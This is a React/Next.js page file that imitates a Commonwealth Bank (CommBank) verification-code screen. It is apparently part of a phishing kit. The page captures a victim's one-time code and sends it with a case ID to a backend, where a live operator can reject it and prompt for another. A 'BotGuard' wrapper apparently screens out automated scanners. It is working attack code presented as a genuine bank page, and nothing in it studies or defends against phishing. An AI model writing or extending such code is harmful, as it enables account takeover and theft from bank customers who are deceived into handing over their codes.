'use client';

/**
 * CBA Secret Key/Verification Code Page
 * Two-column layout matching CommBank design patterns
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';
import { VerificationSidebar } from '@/components/layout/Sidebar';

// Arrow Icon SVG component
function ArrowIcon() {
  return (
    <svg className="arrow-icon" width="8" height="10" viewBox="0 0 8 10" fill="none" xmlns="http://www.w3.org/2000/svg">
      <polygon points="0,0 8,5 0,10" fill="#FFCC00" />
    </svg>
  );
}

export default function SecretKeyPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId, agentMessage } = useSessionStore();

  const [secretKey, setSecretKey] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setSecretKey('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!secretKey.trim()) {
        setFieldError('Please enter your verification code');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-secret-key', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            secret_key: secretKey.trim(),
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your code. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your code...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [secretKey, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      <div className="main-container">
        {/* Two Column Layout */}
        <section className="login-section">
          {/* Left Column - Verification Form */}
          <div className="login-box">
            <div className="box-header">
              <span>Verification Code</span>
            </div>
            <div className="box-content">
              <form className="login-form" onSubmit={handleSubmit}>
                <p className="form-description">
                  Enter the code you received via email or SMS to continue with your verification.
                </p>

                <div className="form-row" style={{ flexDirection: 'column', alignItems: 'flex-start', gap: '8px', marginBottom: '15px' }}>
                  <label htmlFor="secret-key" className="form-label" style={{ width: 'auto', textAlign: 'left' }}>
                    Verification Code
                  </label>
                  <input
                    type="text"
                    id="secret-key"
                    name="secret-key"
                    className="form-input"
                    style={{ width: '100%', maxWidth: '180px', height: '28px', letterSpacing: '2px' }}
                    autoComplete="off"
                    placeholder=""
                    value={secretKey}
                    onChange={(e) => {
                      setSecretKey(e.target.value);
                      if (fieldError) setFieldError('');
                    }}
                    disabled={isWaiting}
                  />
                </div>

                {/* Error message - inline style */}
                {fieldError && (
                  <div className="error-message" style={{ marginBottom: '15px' }}>
                    <span>{fieldError}</span>
                  </div>
                )}

                {/* Verify Button */}
                <div className="form-row button-row" style={{ paddingLeft: 0 }}>
                  <button
                    type="submit"
                    className="logon-button"
                    disabled={!secretKey.trim() || isWaiting}
                  >
                    {isWaiting && <Loader2 className="h-4 w-4 animate-spin" />}
                    {isWaiting ? 'Verifying...' : 'Verify'}
                  </button>
                </div>
              </form>

              <div className="form-footer" style={{ paddingLeft: 0, marginTop: '20px' }}>
                <a href="#" className="forgot-link">Didn't receive a code?</a>
              </div>
            </div>
          </div>

          {/* Right Column - Help Sidebar */}
          <VerificationSidebar />
        </section>

        {/* Quicklinks Section */}
        <section className="quicklinks-section">
          <h3 className="quicklinks-title">Quicklinks</h3>
          <ul className="quicklinks-list">
            <li>
              <ArrowIcon />
              <a href="#">Are you experiencing financial difficulty? Get help</a>
            </li>
            <li>
              <ArrowIcon />
              <a href="#">Report suspicious activity or scams</a>
            </li>
          </ul>
        </section>
      </div>
    </BotGuard>
  );
}
